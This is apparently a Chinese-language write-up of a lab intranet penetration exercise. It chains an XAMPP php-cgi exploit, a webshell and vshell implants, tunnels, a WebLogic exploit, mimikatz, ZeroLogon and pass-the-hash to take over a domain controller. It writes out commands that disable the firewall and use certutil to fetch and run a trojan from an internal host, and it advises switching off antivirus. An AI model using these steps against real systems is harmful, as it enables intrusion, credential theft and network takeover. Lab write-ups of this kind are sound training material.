目标地址：192.168.111.79

本机地址：192.168.111.25

拿到ip，用无影先扫端口

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/070cccbe229c.webp)

fscan扫一下

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/3b3ea7065876.webp)

发现一个xampp，百度一下发现是有一个php cgi漏洞的

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/34f7c770bb96.webp)

直接使用无影的poc检测

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/88906f906491.webp)

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/98a0260d8ce9.webp)

可以看到漏洞确实存在

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/28160bb79444.png)

右键查看这个数据包

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/23b6543f26a0.webp)

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/6e6f4be24327.webp)

phpinfo代码确实能够执行

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/f9bf24f5058e.webp)

在phpinfo中找到网站路径

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/d43c409e5d7b.webp)

接着构造数据包写马子到网站路径，数据包如下

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/ecb402eaf109.png)

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/69a060bf0760.webp)

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/d53a11b94c41.png)

上线vshell

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/69f6049030a9.webp)

启用监听器

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/56f138690962.webp)

判断操作系统和架构

Windows

```sql
systeminfo
```

Linux

```sql
uname -a
```

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/f39456624fde.webp)

根据系统架构选择反向shell，注意记得把实时保护关掉，否则直接清马

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/bdead146ab64.webp)

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/3f0281f85aa2.webp)

用蚁剑上传并执行

刷新一下，上线成功

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/bd4359bd0155.webp)

为上线的机器新增内网隧道

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/63744f808dde.webp)

本地使用proxifier连接隧道

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/91d4f4f73018.png)

现在配置文件中添加代理服务器

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/8b0e3279c488.png)

然后创建代理规则

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/5a0e3ba6658c.webp)

然后因为vshell的插件有问题，所以我们上传fscan进行内网探测

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/fdbbddd8087a.webp)

这边发现是有两台主机存活

192.168.2.22

192.168.2.33

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/ab4136eeb0b5.webp)

33是一个模拟永恒之蓝的环境

思路就是用命令先关闭防火墙，在已拿下的靶机（.3）上上传正向木马，然后使用windows（.33）的下载器下载木马，再执行上线

用vshell生成正向木马，上传到xampp网站根目录

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/0beade6f3771.webp)

关闭防火墙

```bash
netsh advfirewall set allprofiles state off
```

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/ec76ca56c936.webp)

用windows下载器下载木马

```bash
certutil.exe -urlcache -split -f http://192.168.2.3:80/4488.exe C:/4488.exe
```

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/3113e9780877.webp)

运行木马

```bash
C:/4488.exe
```

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/f6bdbd18a93e.webp)

这里我犯傻了，这是监听的程序，我还一直等他运行完，现在要去vshell进行连接

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/c033b03c0b43.webp)

这里没连上，推测80端口可能占用了，所以我们换一个端口12306

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/36ce0310b9c4.webp)

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/6e2520ff6bbe.webp)

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/a6878a1dedbf.webp)

内网机器成功上线，192.168.2.33（无双网卡）拿下，192.168.2.22同手法

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/a7f96080a26a.webp)

关闭防火墙

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/e415f02616cf.webp)

下载正向木马

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/00bf85ae3bef.webp)

运行木马

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/85a72079ae30.webp)

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/9e94cc280364.webp)

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/9879bf151b5f.webp)

192.168.2.22执行ipconfig，发现双网卡

上传fscan，对.3网段进行信息搜集

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/72179e1b7135.webp)

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/aa1e6a948eed.webp)

这边尝试了很多次，按理说应该能扫出一个192.168.3.34，但是没扫出来，这边就直接针对扫

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/ff08d3c1b037.webp)

发现3.34是有一个weblogic的漏洞的

搭隧道，使用weblogic漏洞工具进行利用

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/8ff77cfb7fb0.webp)

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/4e7d232f4582.webp)

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/b4f54f2ba81a.png)

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/6e6c1bb425ad.png)

注入内存马

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/3a919f44d515.png)

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/ef33b2a0c46f.png)

记得改一下有效载荷

关防火墙，传正向马

```bash
netsh advfirewall set allprofiles state off
```

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/94369bd52a2d.webp)

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/a9eee7178e6a.png)

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/4a96b6ad3948.webp)

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/c0e7330a4c7c.webp)

发现10网段

直接使用vshell的mimikatz插件尝试读一下密码

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/befaa0070ec8.webp)

读到明文密码Admin12345

上传fscan扫10段

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/ae7e342c09fc.webp)

使用已知明文凭据尝试连接192.168.10.12和192.168.10.10，需要再在10.88上搭一个隧道

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/6cc523bcd39d.webp)

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/d596200e451e.png)

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/d877b9928362.png)

这里注意需要去改一下本地（攻击机）的hossts

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/d89045de162a.png)

利用 ZeroLogon 漏洞将域控机器账户密码置空

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/6ad144a0d25c.png)

secretsdump.py 成功导出了域内所有用户的密码哈希和 Kerberos 密钥。

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/b21491f2a18e.png)

通过 Pass-the-Hash（哈希传递）拿到了域控（192.168.10.10）的最高权限交互式 Shell

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/8cc0534f5d0b.webp)

在weblogic上部署含木马的war包，然后还是命令执行下载器进行下载木马，执行上线

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/98ecabdbbc7f.webp)

现在已经拿到域管，WebLogic 的后台密码可以直接从靶机文件系统里拖出来